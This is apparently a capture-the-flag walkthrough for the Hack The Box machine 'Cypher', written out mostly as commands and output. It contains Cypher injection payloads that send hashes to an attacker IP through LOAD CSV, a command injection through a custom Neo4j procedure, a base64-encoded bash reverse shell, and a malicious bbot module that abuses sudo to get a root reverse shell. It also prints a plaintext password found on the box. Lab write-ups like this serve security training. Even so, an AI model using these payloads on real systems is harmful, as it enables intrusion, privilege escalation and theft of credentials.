# User flag
## 1. rustscan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: GRAPH ASM
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nothing too interesting, check website.

## 2. check `cypher.htb`
```javascript
<script>
    // TODO: don't store user accounts in neo4j
    function doLogin(e) {
      e.preventDefault();
      var username = $("#usernamefield").val();
      var password = $("#passwordfield").val();
      $.ajax({
        url: '/api/auth',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({ username: username, password: password }),
        success: function (r) {
          window.location.replace("/demo");
        },
        error: function (r) {
          if (r.status == 401) {
            notify("Access denied");
          } else {
            notify(r.responseText);
          }
        }
      });
    }

    $("form").keypress(function (e) {
      if (e.keyCode == 13) {
        doLogin(e);
      }
    })

    $("#loginsubmit").click(doLogin);
  </script>
```

NOTE: there is a neo4j database

## 3. dirsearch
```bash
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ dirsearch -u http://cypher.htb/ -e* -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25 | Wordlist size: 220544

Output File: /home/kali/Desktop/htb/reports/http_cypher.htb/__25-03-04_02-54-29.txt

Target: http://cypher.htb/

[02:54:29] Starting: 
[02:54:33] 200 -    5KB - /about                                            
[02:54:33] 200 -    4KB - /login                                            
[02:54:37] 307 -    0B  - /demo  ->  /login                                 
[02:54:42] 404 -   22B  - /demos                                            
[02:54:43] 307 -    0B  - /api  ->  /api/docs                               
[02:54:47] 301 -  178B  - /testing  ->  http://cypher.htb/testing/    => interesting
```

![[Pasted image 20250304160710.png]]


## 4. Test out /api/auth
```powershell
POST /api/auth HTTP/1.1

Host: cypher.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json

X-Requested-With: XMLHttpRequest

Content-Length: 55

Origin: http://cypher.htb

Connection: keep-alive

Referer: http://cypher.htb/login



{"username":"' OR 1=1 RETURN u /**/","password":"/**/"}



=> response 

"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 76 (offset: 75))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = ' ' OR 1=1 RETURN u /**/' return h.value as hash"
                                                                            ^}
```

### Start injection

```powershell
# 1. ' OR 1=1 LOAD CSV FROM 'http://10.10.14.40:7777/'+h.value AS y RETURN ''//
POST /api/auth HTTP/1.1

Host: cypher.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json

X-Requested-With: XMLHttpRequest

Content-Length: 145

Origin: http://cypher.htb

Connection: keep-alive

Referer: http://cypher.htb/login


{"username":"' OR 1=1 LOAD CSV FROM 'http://10.10.14.40:7777/'+h.value AS y RETURN ''////","password":"/**/"}


=> nc get response
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.40] from (UNKNOWN) [10.129.130.78] 50102
GET /9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1
User-Agent: NeoLoadCSV_Java/17.0.14+7-Ubuntu-124.04
Host: 10.10.14.40:7777
Accept: text/html, image/gif, image/jpeg, */*; q=0.2
Connection: keep-alive

# 2. ' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.40/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
get error message: Invalid URL 'http://10.10.14.40/?version=5.24.1&name=Neo4j Kernel&edition=community': Illegal character in query at index 45: http://10.10.14.40/?version=5.24.1&name=Neo4j Kernel&edition=community ()}

# 3. provide password
{"username":"' OR 1=1 return '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' as hash //","password":"password"}

> successfully login into http://cypher.htb/demo
```

## 5. RCE
```
# find this in /testing

Exceptions�java/lang/Exception  Signaturec(Ljava/lang/String;)Ljava/util/stream/Stream<Lcom/cypher/neo4j/apoc/CustomFunctions$StringOutput;>;RuntimeVisibleAnnotationsLorg/neo4j/procedure/Procedure;namecustom.getUrlStatusCodemode▒Lorg/neo4j/procedure/Mode;READ!Lorg/neo4j/procedure/Description;value:Returns the HTTP status code for the given URL as a string"RuntimeVisibleParameterAnnotations▒Lorg/neo4j/procedure/Name;
SourceFileCustomFunctions.java
                              NestMembersBootstrapMethod�       https:/�:curl -s -o /dev/null --connect-timeout 1 -w %{http_code}�
Command:�Status code:�▒Process exited with code�Error output:
```

Payload:
`CALL custom.getUrlStatusCode("ecorp.com;ping -c 1 10.10.14.40") YIELD statusCode RETURN statusCode`

![[Pasted image 20250304192818.png]]

**Get reverse shell:**
```bash
CALL custom.getUrlStatusCode("ecorp.com;echo 'YmFzaCAgICAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjQwLzc3NzcgMD4mMSA='|base64 -d|bash") YIELD statusCode RETURN statusCode

$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.40] from (UNKNOWN) [10.129.130.78] 45294
bash: cannot set terminal process group (1413): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$

neo4j@cypher:/home/graphasm$ cat bb
cat bbot_preset.yml 
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK

su graphasm
Password: cU4btyib.20xtCMCXkBmerhK

id
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)
ls
bbot_preset.yml
user.txt
cat user.txt
```

# Root flag

```bash
graphasm@cypher:~/.ssh$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot

graphasm@cypher:~/.ssh$ sudo bbot -t /root/root.txt -d
```

## Shell
read this: https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto

```python
from bbot.modules.base import BaseModule
import os

class ls_module(BaseModule):
    watched_events = ["DNS_NAME"]  # No events to watch
    produced_events = ["LS_OUTPUT"]  # The event to produce after running 'ls'
    flags = ["passive", "safe"]
    meta = {"description": "Runs 'ls' command and returns the output line by line"}
    per_domain_only = True

    async def setup(self):
        # Any setup needed for the module (e.g., checking for permissions)
        print("abcdedfgtjakfkjsadkfjas==========================================")
        print(os.system('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.40/443 0>&1"'))
        return True

    async def handle_event(self, event):
        self.hugesuccess(f"Got i{event} ================fdsajkfksdajfkjkdsalf====================")

        # Use 'await self.run_process' to run the 'ls' command and capture output
        ls_result = await self.run_process("ls", "-l")

        # Iterate through each line in the output
        for line in ls_result.stdout.splitlines():
            # Do something with each line of the output
            self.hugeinfo(f"Line from ls: {line.decode()}")

        # Alternatively, you can process the output in real time with 'run_process_live'
        async for line in self.run_process_live(["grep", "-R", "pattern"]):
            # Do something with each line of 'grep' output in real time
            self.hugeinfo(f"Live grep line: {line.decode()}")


graphasm@cypher:~/my_modules$ sudo bbot -p /home/graphasm/bbot_preset.yml -m ls_module -t a -d


root@cypher:~# cat root.txt
```